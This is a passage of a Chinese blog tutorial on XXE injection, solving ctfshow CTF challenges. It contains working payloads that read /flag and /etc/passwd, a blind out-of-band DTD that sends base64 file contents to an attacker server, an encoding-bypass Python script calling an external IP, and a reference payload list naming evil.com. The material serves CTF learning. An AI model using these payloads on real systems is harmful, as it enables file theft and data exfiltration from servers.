</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>特性</th><th>PCDATA</th><th>CDATA</th></tr></thead><tbody><tr><td><strong>解析</strong></td><td>解析器会解析 PCDATA 的内容，并识别标签或实体引用。</td><td>CDATA 中的内容不会被解析，全部作为文本处理。</td></tr><tr><td><strong>使用特殊字符</strong></td><td>必须对特殊字符（如 <code>&lt;</code> 和 <code>&</code>）进行转义。</td><td>特殊字符可以直接使用，不需要转义。</td></tr><tr><td><strong>典型用途</strong></td><td>适用于普通文本和可解析的标记内容。</td><td>适用于代码片段或不希望被解析的文本内容。</td></tr><tr><td><strong>定义形式</strong></td><td>直接包含在元素内容中。</td><td>使用 <code>&lt;![CDATA[...]]></code> 声明来包含数据。</td></tr><tr><td><strong>嵌套标签</strong></td><td>可以解析嵌套标签（如 <code>&lt;b></code>），并按标签的定义渲染。</td><td>嵌套标签不会被解析成标记，而是作为文本内容显示。</td></tr></tbody></table></div><h3 id=元素>元素</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE note [
</span></span></span><span class=line><span class=cl><span class=cp>  &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
</span></span><span class=line><span class=cl>  <span class=cp>&lt;!ELEMENT to      (#PCDATA)&gt;</span>
</span></span><span class=line><span class=cl>  <span class=cp>&lt;!ELEMENT from    (#PCDATA)&gt;</span>
</span></span><span class=line><span class=cl>  <span class=cp>&lt;!ELEMENT heading (#PCDATA)&gt;</span>
</span></span><span class=line><span class=cl>  <span class=cp>&lt;!ELEMENT body    (#PCDATA)&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;note&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;to&gt;</span>George<span class=nt>&lt;/to&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;from&gt;</span>John<span class=nt>&lt;/from&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;heading&gt;</span>Reminder<span class=nt>&lt;/heading&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;body&gt;</span>Don&#39;t forget the meeting!<span class=nt>&lt;/body&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/note&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>元素顺序是固定了的，所以在书写的时候也必须按着这个写，然后捏插入特殊符号也不能直接写</p><p>xml的书写特性</p><ul><li>所有XMl元素必须有一个闭合标签</li><li>XMl标签对大小写敏感</li><li>XMl必须正确嵌套</li><li>XML属性值必须加引号</li><li>实体引用</li><li>在XMl中，空格会被保留</li></ul><h2 id=xxe>xxe</h2><p>看了上面的东西其实也就会写个最简单的请求，不要晕了</p><p>xxe是<strong>xml外部实体注入漏洞</strong>，那么既然是外部实体，所以其他的也就没有那么的重要，既然是注入那么这里有张图可以参考</p><p><img src=/p/xxe-in-depth/QQ20240918-151634.png width=713 height=450 loading=lazy alt=2></p><p>那么漏洞原理是什么呢</p><blockquote><p><strong>让服务端在解析XML文档时，对声明的外部实体进行引用，实际触发攻击者预定的文件、网络等资源操作，甚至是执行系统命令</strong></p></blockquote><p>这里的Demo就选择ctfshow <code>web</code>入门的<code>xxe</code>模块吧</p><h3 id=demo1>Demo1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$xmlfile</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span> <span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$creds</span> <span class=o>=</span> <span class=nx>simplexml_import_dom</span><span class=p>(</span><span class=nv>$dom</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ctfshow</span> <span class=o>=</span> <span class=nv>$creds</span><span class=o>-&gt;</span><span class=na>ctfshow</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$ctfshow</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
</span></span></code></pre></td></tr></table></div></div><p>可以进行外部实体加载，并且正常读取<code>xml</code>文档，读取<code>ctfshow</code>元素，根元素自己写</p><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;wi&gt;&lt;ctfshow&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/ctfshow&gt;&lt;/wi&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>直接打入即可，刚写的时候可能是容易写错的，我就写错了，所以建议找个在线<code>xml</code>辨别器</p><h3 id=demo2>Demo2</h3><p><strong>web374</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$xmlfile</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span> <span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里一看就没有回显了，所以payload其实不用太大的改变，只是我们需要进行dtd的远程书写一下</p><p>现在自己vps上面写一个<code>test.dtd</code>,我建议是在dtd里面写多些关键文件，这样子是不会被<code>pass</code>的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dtd data-lang=dtd><span class=line><span class=cl><span class=k>&lt;!ENTITY</span> <span class=ni>%</span> <span class=ni>file</span> <span class=kc>SYSTEM</span> <span class=s2>&#34;php://filter/read=convert.base64-encode/resource=file:///flag&#34;</span><span class=k>&gt;</span>
</span></span><span class=line><span class=cl><span class=k>&lt;!ENTITY</span> <span class=ni>%</span> <span class=ni>eval</span> <span class=s2>&#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://ip:9999/?x=%file;&#39;&gt;&#34;</span><span class=k>&gt;</span>
</span></span><span class=line><span class=cl><span class=ni>%eval;</span>
</span></span><span class=line><span class=cl><span class=ni>%exfiltrate;</span>
</span></span></code></pre></td></tr></table></div></div><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml  version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;http://ip/test.dtd&#34;&gt;</span>%xxe;]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;root&gt;&lt;ctfshow&gt;</span>123;<span class=nt>&lt;/ctfshow&gt;&lt;/root&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后监听端口<code>9999</code>即可,这里的IP必须写能够进行<code>web</code>服务的,如果是开的特殊端口的话要把端口加上</p><p>其实我自己写的时候卡了一会，因为我不理解为什么定义参数实体的时候写成<code>&amp;#x25;</code>而不是直接就写<code>&amp;#x25</code>,后来想了想问了几个师傅，其实应该算是一种固定格式吧，因为参数实体的定义是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>% name
</span></span><span class=line><span class=cl>这里为了正常的解析
</span></span><span class=line><span class=cl><span class=ni>&amp;#x25;</span> 也就是使用了16进制字符实体，这里的;是为了隔断解析方式
</span></span></code></pre></td></tr></table></div></div><p>比如前面解析的时候是用的Unicode，但是我后面是需要正常解析才行的，所以就用<code>;</code>进行隔断</p><p>可能还有一个小小的疑惑(<del>第二天早上突然发现</del>)就是为什么没有进行<code>&amp;xxe;</code>的实体调用，我看网上很多<code>payload</code>都是这么写的，但是我这里三个实体都是<strong>参数实体</strong>，<strong>直接就调用了</strong>，所以在他们进行<strong>外部实体</strong>调用的时候我随便写个123也可完成<code>xxe</code></p><h3 id=demo3>Demo3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$xmlfile</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&lt;\?xml version=&#34;1\.0&#34;|http/i&#39;</span><span class=p>,</span> <span class=nv>$xmlfile</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT</span> <span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
</span></span></code></pre></td></tr></table></div></div><p>那么当禁用了http的时候我们怎么操作呢，很简单，写个脚本来编码绕过即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;https://91baacfb-f234-4f53-bc4f-412652b34241.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>&lt;!DOCTYPE foo [&lt;!ENTITY </span><span class=si>% x</span><span class=s1>xe SYSTEM &#34;http://27.25.151.48:12138/test.dtd&#34;&gt;</span><span class=si>%x</span><span class=s1>xe;]&gt;
</span></span></span><span class=line><span class=cl><span class=s1>&lt;root&gt;123;&lt;/root&gt;
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-16&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>,</span><span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>其实这里的话这个元素怎么猜，这就是能猜了呀，因为本身是<code>ctfshow</code>的本台要么就是<code>ctfshow</code>，要么就是<code>root</code>这些默认的,不写声明也能<code>xxe</code>大家应该知道吧</p><h3 id=demo4>Demo4</h3><p><strong>ctfshow web378</strong></p><p>这里直接默认就登录成功了，也不需要爆破，但是没有进入理想的页面,抓包发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>Rsponse</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>doLogin</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>username</span> <span class=o>=</span> <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#username&#34;</span><span class=p>).</span><span class=nx>val</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>password</span> <span class=o>=</span> <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;#password&#34;</span><span class=p>).</span><span class=nx>val</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>username</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span> <span class=o>||</span> <span class=nx>password</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Please enter the username and password!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>data</span> <span class=o>=</span> <span class=s2>&#34;&lt;user&gt;&lt;username&gt;&#34;</span> <span class=o>+</span> <span class=nx>username</span> <span class=o>+</span> <span class=s2>&#34;&lt;/username&gt;&lt;password&gt;&#34;</span> <span class=o>+</span> <span class=nx>password</span> <span class=o>+</span> <span class=s2>&#34;&lt;/password&gt;&lt;/user&gt;&#34;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>type</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>url</span><span class=o>:</span> <span class=s2>&#34;doLogin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>contentType</span><span class=o>:</span> <span class=s2>&#34;application/xml;charset=utf-8&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>data</span><span class=o>:</span> <span class=nx>data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>dataType</span><span class=o>:</span> <span class=s2>&#34;xml&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>anysc</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>success</span><span class=o>:</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        	<span class=kd>var</span> <span class=nx>code</span> <span class=o>=</span> <span class=nx>result</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>childNodes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>nodeValue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        	<span class=kd>var</span> <span class=nx>msg</span> <span class=o>=</span> <span class=nx>result</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s2>&#34;msg&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>childNodes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>nodeValue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        	<span class=k>if</span><span class=p>(</span><span class=nx>code</span> <span class=o>==</span> <span class=s2>&#34;0&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        		<span class=nx>$</span><span class=p>(</span><span class=s2>&#34;.msg&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>msg</span> <span class=o>+</span> <span class=s2>&#34; login fail!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        	<span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nx>code</span> <span class=o>==</span> <span class=s2>&#34;1&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        		<span class=nx>$</span><span class=p>(</span><span class=s2>&#34;.msg&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>msg</span> <span class=o>+</span> <span class=s2>&#34; login success!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        		<span class=nx>$</span><span class=p>(</span><span class=s2>&#34;.msg&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=s2>&#34;error:&#34;</span> <span class=o>+</span> <span class=nx>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        	<span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=nx>error</span><span class=o>:</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>XMLHttpRequest</span><span class=p>,</span><span class=nx>textStatus</span><span class=p>,</span><span class=nx>errorThrown</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>$</span><span class=p>(</span><span class=s2>&#34;.msg&#34;</span><span class=p>).</span><span class=nx>text</span><span class=p>(</span><span class=nx>errorThrown</span> <span class=o>+</span> <span class=s1>&#39;:&#39;</span> <span class=o>+</span> <span class=nx>textStatus</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里看到源码,从这里也可以浅浅的看到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>data</span> <span class=o>=</span> <span class=s2>&#34;&lt;user&gt;&lt;username&gt;&#34;</span> <span class=o>+</span> <span class=nx>username</span> <span class=o>+</span> <span class=s2>&#34;&lt;/username&gt;&lt;password&gt;&#34;</span> <span class=o>+</span> <span class=nx>password</span> <span class=o>+</span> <span class=s2>&#34;&lt;/password&gt;&lt;/user&gt;&#34;</span><span class=p>;</span> 
</span></span></code></pre></td></tr></table></div></div><p><code>xxe</code>确实是一种注入的攻击手法</p><p>看到是进行<code>xml</code>文档的登录，所以直接<code>xxe</code>，这里看一下发包吧主要就是也有一些地方要改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /doLogin HTTP/1.1
</span></span><span class=line><span class=cl>Host: 75a0196a-e978-4264-86a2-1cccf066c2a6.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: cf_clearance=VDdapNbpwbPn6a1IM_PxJ0JXmcd0KRqr0Bf_cjtzjRY-1722865983-1.0.1.1-z9eFIJzdq2FOhOt1m9jPdicCjw4UPrBmoItiz1nAqzyxbXVOdGYDAqZJdUurUqU3FJLTgOSn3lo8Eml1_VWjXg
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;128&#34;, &#34;Not;A=Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;128&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-site
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Referer: https://ctf.show/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/xml;charset=utf-8
</span></span><span class=line><span class=cl>Content-Length: 122
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;!DOCTYPE test [
</span></span><span class=line><span class=cl>&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl>&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table></div></div><p>这四个Demo基本就覆盖了一些类型，当然肯定有其他的进攻点，但是手法思路都是这个，只需要改改协议什么的就可以了</p><p>还有就是这四个Demo的，有些特别是blind不用和我写的一样，我其实发现了很多写法，可以自己尝试一下</p><h2 id=参考payload>参考payload</h2><h3 id=文件读取>文件读取</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;foo&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/foo&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=blind-文件读取>blind 文件读取</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE foo [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY % xxe SYSTEM &#34;http://evil.com/xxeoobdetector&#34;&gt;</span> %xxe;
